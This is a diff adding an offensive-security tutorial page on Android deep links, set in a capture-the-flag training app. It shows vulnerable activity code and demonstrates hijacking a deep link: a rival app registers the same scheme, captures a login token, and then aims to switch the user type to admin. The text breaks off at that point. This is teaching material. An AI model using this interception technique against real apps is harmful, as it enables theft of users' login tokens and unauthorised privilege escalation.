@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>offsecnotes | Deep links</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>Deep links</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#overview" id="toc-overview">Overview</a>
+<ul>
+<li><a href="#working-with-deep-links" id="toc-working-with-deep-links">Working with deep links</a></li>
+</ul></li>
+<li><a href="#hijacking-deep-link-intents" id="toc-hijacking-deep-link-intents">Hijacking deep link intents</a></li>
+<li><a href="#generic-chrome-intent" id="toc-generic-chrome-intent">Generic chrome intent</a>
+<ul>
+<li><a href="#example" id="toc-example">Example</a></li>
+</ul></li>
+</ul></div>
+  <hr>
+<blockquote>
+<p><strong>Note</strong>: this section requires a full understanding of <a href="intent%20attack%20surface.html">Intent attack surface</a>.</p>
+</blockquote>
+<h2 id="overview">Overview</h2>
+<p>Deep links bridge websites and mobile apps by allowing a webpage or link to launch a specific app screen. An app signals that it handles deep links by declaring an activity with an <code>intent-filter</code> that includes the <code>BROWSABLE</code> category; this means the activity can be started from a web browser. Such filters usually include one or more <code>&lt;data&gt;</code> tags, for example: <code>&lt;data android:scheme="example" /&gt;</code>.</p>
+<p>Deep links are important from a security perspective because they expand the attack surface from app-to-app communication to the broader web. If a user clicks a malicious link, it can trigger the target activity. Although the amount of data that can be passed via a deep link is generally smaller than with direct app-to-app IPC, any vulnerability exposed through a deep link is often more serious because it can be exploited remotely via the web.</p>
+<h3 id="working-with-deep-links">Working with deep links</h3>
+<p>Let’s say that the app <code>io.hextree.attacksurface</code> has the following activity:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.activities.Flag13Activity&quot;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span>&gt;</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">action</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.BROWSABLE&quot;</span>/&gt;</span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">data</span><span class="ot"> android:scheme=</span><span class="st">&quot;hex&quot;</span>/&gt;</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">data</span><span class="ot"> android:host=</span><span class="st">&quot;open&quot;</span>/&gt;</span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">data</span><span class="ot"> android:host=</span><span class="st">&quot;flag&quot;</span>/&gt;</span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">activity</span>&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb2"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag13Activity <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">Flag13Activity</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">boolean</span> <span class="fu">isDeeplink</span><span class="op">(</span>Intent intent<span class="op">)</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="fu">getIntent</span><span class="op">();</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>intent <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span><span class="fu">finish</span><span class="op">();}</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span><span class="fu">isDeeplink</span><span class="op">(</span>intent<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>            Uri data <span class="op">=</span> intent<span class="op">.</span><span class="fu">getData</span><span class="op">();</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>data<span class="op">.</span><span class="fu">getHost</span><span class="op">().</span><span class="fu">equals</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">)</span> <span class="op">&amp;&amp;</span> data<span class="op">.</span><span class="fu">getQueryParameter</span><span class="op">(</span><span class="st">&quot;action&quot;</span><span class="op">).</span><span class="fu">equals</span><span class="op">(</span><span class="st">&quot;give-me&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>                <span class="fu">success</span><span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>                <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(!</span>data<span class="op">.</span><span class="fu">getHost</span><span class="op">().</span><span class="fu">equals</span><span class="op">(</span><span class="st">&quot;open&quot;</span><span class="op">)</span> <span class="op">||</span> data<span class="op">.</span><span class="fu">getQueryParameter</span><span class="op">(</span><span class="st">&quot;message&quot;</span><span class="op">)</span> <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a>                Toast<span class="op">.</span><span class="fu">makeText</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;Website: &quot;</span> <span class="op">+</span> data<span class="op">.</span><span class="fu">getQueryParameter</span><span class="op">(</span><span class="st">&quot;message&quot;</span><span class="op">),</span> <span class="dv">1</span><span class="op">).</span><span class="fu">show</span><span class="op">();</span></span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a>                <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a>        Intent intent2 <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">(</span><span class="st">&quot;android.intent.action.VIEW&quot;</span><span class="op">);</span></span>
+<span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a>        intent2<span class="op">.</span><span class="fu">setData</span><span class="op">(</span>Uri<span class="op">.</span><span class="fu">parse</span><span class="op">(</span><span class="st">&quot;https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=hex://open?message=Hello+World&quot;</span><span class="op">));</span></span>
+<span id="cb2-26"><a href="#cb2-26" aria-hidden="true" tabindex="-1"></a>        <span class="fu">startActivity</span><span class="op">(</span>intent2<span class="op">);</span></span>
+<span id="cb2-27"><a href="#cb2-27" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb2-28"><a href="#cb2-28" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>You can just open a deep link as follow: <code>hex://flag?action=give-me</code>.</p>
+<hr />
+<h2 id="hijacking-deep-link-intents">Hijacking deep link intents</h2>
+<p>Let’s say that the app <code>io.hextree.attacksurface</code> has the following activity:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.activities.Flag14Activity&quot;</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span>&gt;</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">action</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.BROWSABLE&quot;</span>/&gt;</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">data</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:scheme=</span><span class="st">&quot;hex&quot;</span></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:host=</span><span class="st">&quot;token&quot;</span>/&gt;</span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">activity</span>&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb4"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag14Activity <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">Flag14Activity</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="kw">throws</span> <span class="bu">NoSuchAlgorithmException</span> <span class="op">{</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="fu">getIntent</span><span class="op">();</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>intent <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span><span class="fu">finish</span><span class="op">();}</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>intent<span class="op">.</span><span class="fu">getAction</span><span class="op">()</span> <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>            Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Hextree&quot;</span><span class="op">,</span> <span class="st">&quot;browser intent&quot;</span><span class="op">);</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>            Intent intent2 <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">(</span><span class="st">&quot;android.intent.action.VIEW&quot;</span><span class="op">);</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>            <span class="bu">String</span> string <span class="op">=</span> <span class="bu">UUID</span><span class="op">.</span><span class="fu">randomUUID</span><span class="op">().</span><span class="fu">toString</span><span class="op">();</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>            SolvedPreferences<span class="op">.</span><span class="fu">putString</span><span class="op">(</span><span class="fu">getPrefixKey</span><span class="op">(</span><span class="st">&quot;challenge&quot;</span><span class="op">),</span> string<span class="op">);</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>            intent2<span class="op">.</span><span class="fu">setData</span><span class="op">(</span>Uri<span class="op">.</span><span class="fu">parse</span><span class="op">(</span><span class="st">&quot;https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-app-auth?authChallenge=&quot;</span> <span class="op">+</span> string<span class="op">));</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>            <span class="fu">startActivity</span><span class="op">(</span>intent2<span class="op">);</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>intent<span class="op">.</span><span class="fu">getAction</span><span class="op">().</span><span class="fu">equals</span><span class="op">(</span><span class="st">&quot;android.intent.action.VIEW&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>            Uri data <span class="op">=</span> intent<span class="op">.</span><span class="fu">getData</span><span class="op">();</span></span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>            <span class="bu">String</span> queryParameter <span class="op">=</span> data<span class="op">.</span><span class="fu">getQueryParameter</span><span class="op">(</span><span class="st">&quot;type&quot;</span><span class="op">);</span></span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>            <span class="bu">String</span> queryParameter2 <span class="op">=</span> data<span class="op">.</span><span class="fu">getQueryParameter</span><span class="op">(</span><span class="st">&quot;authToken&quot;</span><span class="op">);</span></span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>            <span class="bu">String</span> queryParameter3 <span class="op">=</span> data<span class="op">.</span><span class="fu">getQueryParameter</span><span class="op">(</span><span class="st">&quot;authChallenge&quot;</span><span class="op">);</span></span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a>            <span class="bu">String</span> string2 <span class="op">=</span> SolvedPreferences<span class="op">.</span><span class="fu">getString</span><span class="op">(</span><span class="fu">getPrefixKey</span><span class="op">(</span><span class="st">&quot;challenge&quot;</span><span class="op">));</span></span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>queryParameter <span class="op">==</span> <span class="kw">null</span> <span class="op">||</span> queryParameter2 <span class="op">==</span> <span class="kw">null</span> <span class="op">||</span> queryParameter3 <span class="op">==</span> <span class="kw">null</span> <span class="op">||</span> <span class="op">!</span>queryParameter3<span class="op">.</span><span class="fu">equals</span><span class="op">(</span>string2<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a>                Toast<span class="op">.</span><span class="fu">makeText</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;Invalid login&quot;</span><span class="op">,</span> <span class="dv">1</span><span class="op">).</span><span class="fu">show</span><span class="op">();</span></span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a>                <span class="fu">finish</span><span class="op">();</span></span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a>                <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a>            <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb4-30"><a href="#cb4-30" aria-hidden="true" tabindex="-1"></a>                <span class="bu">String</span> strEncodeToString <span class="op">=</span> Base64<span class="op">.</span><span class="fu">getEncoder</span><span class="op">().</span><span class="fu">encodeToString</span><span class="op">(</span><span class="bu">MessageDigest</span><span class="op">.</span><span class="fu">getInstance</span><span class="op">(</span><span class="st">&quot;SHA-256&quot;</span><span class="op">).</span><span class="fu">digest</span><span class="op">(</span>queryParameter2<span class="op">.</span><span class="fu">getBytes</span><span class="op">()));</span></span>
+<span id="cb4-31"><a href="#cb4-31" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>strEncodeToString<span class="op">.</span><span class="fu">equals</span><span class="op">(</span><span class="st">&quot;a/AR9b0XxHEX7zrjx5KNOENTqbsPi6IsX+MijDA/92w=&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb4-32"><a href="#cb4-32" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">if</span> <span class="op">(</span>queryParameter<span class="op">.</span><span class="fu">equals</span><span class="op">(</span><span class="st">&quot;user&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb4-33"><a href="#cb4-33" aria-hidden="true" tabindex="-1"></a>                        Toast<span class="op">.</span><span class="fu">makeText</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;User login successful&quot;</span><span class="op">,</span> <span class="dv">1</span><span class="op">).</span><span class="fu">show</span><span class="op">();</span></span>
+<span id="cb4-34"><a href="#cb4-34" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span> <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>queryParameter<span class="op">.</span><span class="fu">equals</span><span class="op">(</span><span class="st">&quot;admin&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb4-35"><a href="#cb4-35" aria-hidden="true" tabindex="-1"></a>                        Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag14&quot;</span><span class="op">,</span> <span class="st">&quot;hash: &quot;</span> <span class="op">+</span> strEncodeToString<span class="op">);</span></span>
+<span id="cb4-36"><a href="#cb4-36" aria-hidden="true" tabindex="-1"></a>                        <span class="kw">this</span><span class="op">.</span><span class="fu">f182f</span><span class="op">.</span><span class="fu">addTag</span><span class="op">(</span>queryParameter2<span class="op">);</span></span>
+<span id="cb4-37"><a href="#cb4-37" aria-hidden="true" tabindex="-1"></a>                        Toast<span class="op">.</span><span class="fu">makeText</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;Admin login successful&quot;</span><span class="op">,</span> <span class="dv">1</span><span class="op">).</span><span class="fu">show</span><span class="op">();</span></span>
+<span id="cb4-38"><a href="#cb4-38" aria-hidden="true" tabindex="-1"></a>                        <span class="fu">success</span><span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
+<span id="cb4-39"><a href="#cb4-39" aria-hidden="true" tabindex="-1"></a>                    <span class="op">}</span></span>
+<span id="cb4-40"><a href="#cb4-40" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb4-41"><a href="#cb4-41" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">NoSuchAlgorithmException</span> e<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb4-42"><a href="#cb4-42" aria-hidden="true" tabindex="-1"></a>                <span class="cf">throw</span> <span class="kw">new</span> <span class="bu">RuntimeException</span><span class="op">(</span>e<span class="op">);</span></span>
+<span id="cb4-43"><a href="#cb4-43" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb4-44"><a href="#cb4-44" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb4-45"><a href="#cb4-45" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb4-46"><a href="#cb4-46" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>When the user opens this activity, they are redirected to the web page “https://ht-api…” This page shows that the user is already logged in.</p>
+<p><img src="/static/hijacking-deep-link-intents.png"></p>
+<p>Clicking on ‘Connect’ redirects us to our legitimate app.</p>
+<p>Our first goal is to steal the login information. To achieve this, we first need to register the deep link in the manifest.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;.MainActivity&quot;</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span>&gt;</span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">action</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">action</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.BROWSABLE&quot;</span>/&gt;</span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">data</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:scheme=</span><span class="st">&quot;hex&quot;</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:host=</span><span class="st">&quot;token&quot;</span>/&gt;</span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">activity</span>&gt;</span></code></pre></div>
+<p>Let’s analyse the deep link sent by the browser when the user clicks on the ‘Connect’ button.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>Intent intent <span class="op">=</span> <span class="fu">getIntent</span><span class="op">();</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span>intent <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>    Uri data <span class="op">=</span> intent<span class="op">.</span><span class="fu">getData</span><span class="op">();</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>data <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>        Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;Data&quot;</span><span class="op">,</span> data<span class="op">.</span><span class="fu">toString</span><span class="op">());</span></span></code></pre></div>
+<pre><code>hex://token?authToken=598cc075e4379d027f61c02866917c6f1d992c67&amp;type=user&amp;authChallenge=32803714-576f-4189-a3ea-ff8736f78759</code></pre>
+<p>Great, we successfully stole the login information.</p>
+<p>However, to get the flag, we need to execute the <code>success()</code> method by sending the intent to our legitimate application and changing the user type from <code>user</code> to <code>admin</code>.</p>
